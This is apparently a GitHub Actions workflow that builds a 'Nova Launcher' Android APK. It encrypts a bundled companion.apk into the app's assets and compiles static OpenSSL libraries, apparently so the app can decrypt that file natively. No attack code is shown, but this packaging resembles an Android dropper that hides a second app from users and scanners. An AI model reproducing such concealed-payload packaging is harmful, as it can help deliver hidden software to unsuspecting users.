name: Build Nova Launcher APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    name: Build Release APK
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Verify companion.apk exists
        run: |
          if [ ! -f app/src/main/assets/companion.apk ]; then
            echo "[X] companion.apk missing from assets!"
            exit 1
          fi
          echo "[OK] companion.apk found ($(du -h app/src/main/assets/companion.apk | cut -f1))"

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Install Python dependencies
        run: pip install pycryptodome --break-system-packages

      - name: Encrypt companion.apk → companion.enc
        run: python3 tools/encrypt_companion.py app/src/main/assets/companion.apk app/src/main/assets

      - name: Build OpenSSL static libs for Android
        run: |
          NDK_VER=$(ls $ANDROID_SDK_ROOT/ndk/ | sort -V | tail -1)
          NDK=$ANDROID_SDK_ROOT/ndk/$NDK_VER
          echo "[*] NDK: $NDK"

          # Download OpenSSL source
          curl -L https://www.openssl.org/source/openssl-3.0.13.tar.gz -o openssl.tar.gz
          tar xf openssl.tar.gz
          OPENSSL_SRC=$(pwd)/openssl-3.0.13

          TOOLCHAIN=$NDK/toolchains/llvm/prebuilt/linux-x86_64

          build_openssl() {
            ABI=$1
            TARGET=$2
            API=28

            echo "[*] Building OpenSSL for $ABI"
            OUT=$(pwd)/app/third_party/openssl/$ABI
            mkdir -p $OUT/lib $OUT/include

            cd $OPENSSL_SRC
            make clean 2>/dev/null || true

            export CC=$TOOLCHAIN/bin/${TARGET}${API}-clang
            export CXX=$TOOLCHAIN/bin/${TARGET}${API}-clang++
            export AR=$TOOLCHAIN/bin/llvm-ar
            export RANLIB=$TOOLCHAIN/bin/llvm-ranlib
            export ANDROID_NDK_ROOT=$NDK

            if [ "$ABI" = "arm64-v8a" ]; then
              OPENSSL_TARGET="android-arm64"
            else
              OPENSSL_TARGET="android-arm"
            fi

            ./Configure $OPENSSL_TARGET \
              no-shared no-tests no-ui-console no-stdio \
              -D__ANDROID_API__=$API \
              --prefix=$OUT \
              --openssldir=$OUT

            make -j$(nproc) build_libs
            cp libcrypto.a $OUT/lib/
            cp -r include/openssl $OUT/include/
            echo "[OK] $ABI done — $(ls -lh $OUT/lib/libcrypto.a)"
            cd -
          }

          build_openssl arm64-v8a aarch64-linux-android
          build_openssl armeabi-v7a armv7a-linux-androideabi

      - name: Cache Gradle wrapper
        uses: actions/cache@v4
        with:
          path: gradle/wrapper/gradle-wrapper.jar
          key: gradle-wrapper-${{ runner.os }}

      - name: Grant gradlew permission
        run: chmod +x gradlew

      - name: Build Release APK
        id: build
        run: |
          ./gradlew assembleRelease --stacktrace --no-daemon 2>&1 | tee build.log
          echo "exit_code=${PIPESTATUS[0]}" >> $GITHUB_OUTPUT

      - name: Upload Release APK
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: nova-launcher-release
          path: app/build/outputs/apk/release/app-release.apk
          retention-days: 1
          overwrite: true

      - name: Show APK info
        if: success()
        run: |
          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
          echo "APK: $APK"
          echo "Size: $(du -h $APK | cut -f1)"
          echo "DEX files:"
          unzip -l $APK | grep "\.dex"

      - name: Upload Build Error Log
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: build-error-log
          path: build.log
          retention-days: 7
          overwrite: true
